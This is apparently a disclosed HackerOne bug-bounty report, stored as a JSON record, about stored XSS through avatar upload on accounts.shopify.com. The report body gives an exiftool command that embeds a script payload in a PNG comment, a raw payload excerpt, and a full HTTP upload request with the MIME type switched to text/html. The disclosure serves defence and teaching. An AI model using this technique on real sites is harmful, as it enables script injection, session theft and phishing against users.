@@ -1,0 +1,139 @@
+{
+  "id": 964550,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NjQ1NTA=",
+  "url": "https://hackerone.com/reports/964550",
+  "title": "XSS Stored via Upload avatar PNG [HTML] File in accounts.shopify.com",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2020-08-22T03:35:29.693Z",
+  "submitted_at": "2020-08-22T03:35:29.772Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "zerox4",
+    "url": "/zerox4",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/wueowkvjxynhkjp53pcn8m3bl1x3/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1382,
+    "url": "https://hackerone.com/shopify",
+    "handle": "shopify",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Shopify",
+      "twitter_handle": "",
+      "website": "https://www.shopify.com",
+      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-08-30T15:06:46.208Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-08-30T15:06:46.143Z",
+  "team_member_agreed_on_going_public_at": "2020-08-25T21:25:09.738Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello team,\n\nI found unrestricted file upload via avatar in https://accounts.shopify.com/accounts/<ID>,\n\nand XSS Stored in PNG IDAT chunks using exiftool ,\n\n>exiftool command\n\n```\nexiftool -Comment=\"\\\"><script>alert(prompt('XSS BY ZEROX4'))</script>\" xss_comment_exif_metadata_double_quote.png\n```\n\n\n#Payload \n\nexample :\n\n```\n�PNG\n�\nIHDRdp�TtEXtSoftwareAdobe ImageReadyq�e<9tEXtComment\"><script>alert(prompt('XSS BY ZEROX4'))</script>\n                                                                                                    /-{IDATx���E��K��s�9xd$#���J� %IR$�(���s�9Ñ������evnv���>����q�;;;S�U������\\.����=��=�ܿ��BCb����QHyԑEYՑ�s$s�T�:�x���8���إ�}2`���0P����@�(��j�(����D�J�d�%[�\n```\n\n>or payload file example\n\n>https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/Files/xss_comment_exif_metadata_double_quote.png\n\nand after select payload you should edit mime type of image[HTML] request with burpsuite, from image/png to text /html.\n\nexample:\n\n```\nPOST /accounts/141376700 HTTP/1.1\nHost: accounts.shopify.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://accounts.shopify.com/accounts/141376700\nContent-Type: multipart/form-data; boundary=---------------------------20426576427959059782120179951\nContent-Length: 13530\nOrigin: https://accounts.shopify.com\nDNT: 1\nConnection: close\nCookie: device_id=; _identity_session; __Host-_identity_session_same_site=; _y=; _shopify_y=; _s=; _shopify_s=; _shopify_fs=; subdomain=myzero.myshopify.com; utag_main=; __cfduid=\nUpgrade-Insecure-Requests: 1\n\n-----------------------------20426576427959059782120179951\nContent-Disposition: form-data; name=\"utf8\"\n\nâ\n-----------------------------20426576427959059782120179951\nContent-Disposition: form-data; name=\"_method\"\n\npatch\n-----------------------------20426576427959059782120179951\nContent-Disposition: form-data; name=\"authenticity_token\"\n\n0HXXr+2RHm5QwSvfF4MkpkyouUXgM8Dl/xxxxxx+w+78GWOFVLxSqTOpswgegMl3DgEgKHsV5Qw==\n-----------------------------20426576427959059782120179951\nContent-Disposition: form-data; name=\"account[avatar]\"; filename=\"xss_comment_exif_metadata_double_quote.png\"\nContent-Type: text/html\n\nPNG\n\u001a\n\n```\n\nand the malicious file saved in shopify-assets.shopifycdn.com\n\n>example:\n>https://shopify-assets.shopifycdn.com/accounts/production/account/avatar/8df3da6b-3954-4073-a397-27a4d41db106/avatar_36x36_crop_center.png?v=1598066255\n\nPoC:\n{F958928}\n\n\n{F958927}\n\n## Impact\n\nsteal sensitive user data and phishing accounts",
+  "weakness": {
+    "id": 57,
+    "name": "Violation of Secure Design Principles"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 958927,
+      "file_name": "vokoscreenNG-2020-08-22_06-16-51.mkv",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4BqrrFQQH8kUeq7Ch5qpx764?response-content-disposition=attachment%3B%20filename%3D%22vokoscreenNG-2020-08-22_06-16-51.mkv%22%3B%20filename%2A%3DUTF-8%27%27vokoscreenNG-2020-08-22_06-16-51.mkv&response-content-type=video%2Fx-matroska&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6RGCJK62%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T000635Z&X-Amz-Expires=976&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDbdQ2rRb%2F%2Fc9ewyQpX22GF1Go%2FOM%2FMyqiFkm0p9eh3LQIgNsy%2BL4zLN5COCdSLInEOsFHG0JNWnmL0bDcn5zO5wZkqugUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDDBID0DdepC%2F1VmNuSqOBUVZQsG8fVaP42YjKhvhfhxm6mHh4EdJdZ0pRSKiOQ%2FwybfbhcDsRqXKADKgMk96u2kU%2FuycwH%2B6SlSg7wAr8ap5tVDBXAdqT9dKy3K6Yg7y1WHCK3SrrFC0mOTXvb7i23z5TXCdr8ATC6L8BFq7Ofku69TqSEXdqFZhRLAbwCOyFKSgT1Biv08C72FrOjgRvirm7%2FG0VKFHHfsGD4CuHrmgTezzXc13Ud6Nf14Nds1XCwwuWihFAKnfr56CNe6OMiGEEj29ZrfOXrsGAf4EFj%2BDSX8eRoSCfDtfrNkY47%2B0DOiZ0J37QjqP5B0uqP%2FxKllrjPTdR0WYwis361Z22sAHIZ9AmwjIYuXbYaZfaJyI2b5W85HxTUkKTfIHDXiVVcpByC569yZJZ3wDNka9P2PH7rfK4EZ3zku8JUcd3kdhVyjhACGdp6WgIWR0a9GVJK4QPX5waAm%2F4G254BIGSZx58khDdfvWJuzZd47lde40%2B5wNtA0WW4WShMN3Ye%2B98wrMECIkbB897m%2BPYdrXUkwzkuYXhUVFSNQwN0SnswWoqGqp%2BT%2BhAwOfjnZuYZfXXsbhX2QNWmfDQOodlMGNs1h7B9SP3VbJw1dCGvnCRQ%2BTNjfrxQA3GpOSeU2R1y2XiL%2FNFypuQG6NCX1L7ExAIUr8%2FtkuLa5mFn5D4xqDUJb7rMtDS41Cu1%2BtcZHSC16hdv3HDTKSmD5RMxNgCWCVJs4kND4K9qVlzEYpsQ2FjjDGjNhG7eLPdi3cn7KUdtjNKdJ63xHh0VCNbz41VZjxgTirzZJ5HZZr2PVjmVNojXqZ5MYavW3nOAjlLhx%2Buv3hkMNYqDFs9NzN3rzAfTNsxPP5FIhmKDtfFNkCYje6gTD7xeLMBjqxAWpPFBwPXbTeXXVr1acQm05%2FSVW%2Brpna%2BNyOH8YXetP4P2qRjtUvsOHrKEbfwmKpJqLwjqNu01CsSbAJQITXEHUyredL%2B6lzpa0Zg1YertOOM7VOxWFxKamzNLtSvWxYPVD53VQebOy3DR16w4T8sQ9K4%2F4Kfxc%2FdjRi32%2FaI4JH5yC900mDbtpUCPvA63bSwcDjeWJ0%2BDtYNudv9cFSMRoiyYmC5uxD5sULB%2FZc6%2BE3lw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=085a78f38257b3b43206747c05697a8393927d5c91b0dc9021c400030d183443",
+      "file_size": 6414371,
+      "type": "video/x-matroska",
+      "moderated": null
+    },
+    {
+      "id": 958928,
+      "file_name": "Screenshot_at_2020-08-22_06-07-53.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/agPijZcrSLZooZcnHSrhsD8n?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_at_2020-08-22_06-07-53.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_at_2020-08-22_06-07-53.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6RGCJK62%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T000635Z&X-Amz-Expires=976&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDbdQ2rRb%2F%2Fc9ewyQpX22GF1Go%2FOM%2FMyqiFkm0p9eh3LQIgNsy%2BL4zLN5COCdSLInEOsFHG0JNWnmL0bDcn5zO5wZkqugUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDDBID0DdepC%2F1VmNuSqOBUVZQsG8fVaP42YjKhvhfhxm6mHh4EdJdZ0pRSKiOQ%2FwybfbhcDsRqXKADKgMk96u2kU%2FuycwH%2B6SlSg7wAr8ap5tVDBXAdqT9dKy3K6Yg7y1WHCK3SrrFC0mOTXvb7i23z5TXCdr8ATC6L8BFq7Ofku69TqSEXdqFZhRLAbwCOyFKSgT1Biv08C72FrOjgRvirm7%2FG0VKFHHfsGD4CuHrmgTezzXc13Ud6Nf14Nds1XCwwuWihFAKnfr56CNe6OMiGEEj29ZrfOXrsGAf4EFj%2BDSX8eRoSCfDtfrNkY47%2B0DOiZ0J37QjqP5B0uqP%2FxKllrjPTdR0WYwis361Z22sAHIZ9AmwjIYuXbYaZfaJyI2b5W85HxTUkKTfIHDXiVVcpByC569yZJZ3wDNka9P2PH7rfK4EZ3zku8JUcd3kdhVyjhACGdp6WgIWR0a9GVJK4QPX5waAm%2F4G254BIGSZx58khDdfvWJuzZd47lde40%2B5wNtA0WW4WShMN3Ye%2B98wrMECIkbB897m%2BPYdrXUkwzkuYXhUVFSNQwN0SnswWoqGqp%2BT%2BhAwOfjnZuYZfXXsbhX2QNWmfDQOodlMGNs1h7B9SP3VbJw1dCGvnCRQ%2BTNjfrxQA3GpOSeU2R1y2XiL%2FNFypuQG6NCX1L7ExAIUr8%2FtkuLa5mFn5D4xqDUJb7rMtDS41Cu1%2BtcZHSC16hdv3HDTKSmD5RMxNgCWCVJs4kND4K9qVlzEYpsQ2FjjDGjNhG7eLPdi3cn7KUdtjNKdJ63xHh0VCNbz41VZjxgTirzZJ5HZZr2PVjmVNojXqZ5MYavW3nOAjlLhx%2Buv3hkMNYqDFs9NzN3rzAfTNsxPP5FIhmKDtfFNkCYje6gTD7xeLMBjqxAWpPFBwPXbTeXXVr1acQm05%2FSVW%2Brpna%2BNyOH8YXetP4P2qRjtUvsOHrKEbfwmKpJqLwjqNu01CsSbAJQITXEHUyredL%2B6lzpa0Zg1YertOOM7VOxWFxKamzNLtSvWxYPVD53VQebOy3DR16w4T8sQ9K4%2F4Kfxc%2FdjRi32%2FaI4JH5yC900mDbtpUCPvA63bSwcDjeWJ0%2BDtYNudv9cFSMRoiyYmC5uxD5sULB%2FZc6%2BE3lw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d1e72133f7f6fc58617861f069245f60d2667347f0b093e6336c2f289c55a904",
+      "file_size": 324939,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 55,
+  "voters": [
+    "mr-medi",
+    "drsniper",
+    "yxw21",
+    "mattberg",
+    "ltidi",
+    "ali",
+    "nightm4re",
+    "pwrspl0it",
+    "und3sc0n0c1d0",
+    "2026",
+    "and 45 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 423,
+    "asset_type": "URL",
+    "asset_identifier": "accounts.shopify.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
